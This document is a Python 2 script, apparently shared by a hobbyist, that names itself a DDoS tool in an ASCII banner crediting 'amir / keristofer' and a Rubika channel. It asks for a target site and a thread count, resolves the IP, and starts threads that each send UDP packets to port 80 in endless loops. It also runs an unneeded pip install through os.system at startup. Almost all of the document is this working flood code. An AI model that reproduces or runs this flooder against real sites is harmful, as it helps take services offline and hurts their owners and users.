print(" amir ")
print(" * keristofer * ")
import os 
os.system("pip install datetime")
import time
import socket
import sys
import datetime
import thread 
x = str(datetime.datetime.now())
x = """
	   
	   
    ______________________________________
    |                                     |    
    |       A M I R                       |
    |                                     |
    |                                     |
    |              <keristofer/>          |
    |                                     |
    |                                     |
    |          pedar filtering            |
    |                                     |
    |                                     |
    |  chanel rubuka = @aqa_keristofer    |
    |                                     |
    |       my love atrisa                |
    |                                     |
    |     abar script ddos                |
    |                                     |
    |                                     |
    |   amir [ keristofer ]               |
    |_____________________________________|
	      
     
	      """
for c in x:
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(0.02)     
site = raw_input("Enter the site address => ")
thread_count = input("Enter your thread => ")

ip = socket.gethostbyname(site)

UDP_PORT = 80
MESSAGE = "ViRus32"
print("UDP target IP:")
print("UDP target port:"), UDP_PORT
time.sleep(3)

def dos(i):
        while True:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                   sock.sendto(MESSAGE, (ip, UDP_PORT))
                   print " *Packet Sent* " 		

for i in xrange(thread_count):
         try:
          thread.start_new_thread( dos , ("Thread-"+str(i),) )
         except KeyboardInterrupt:
                   sys.exit(0)
while 1:
   pass
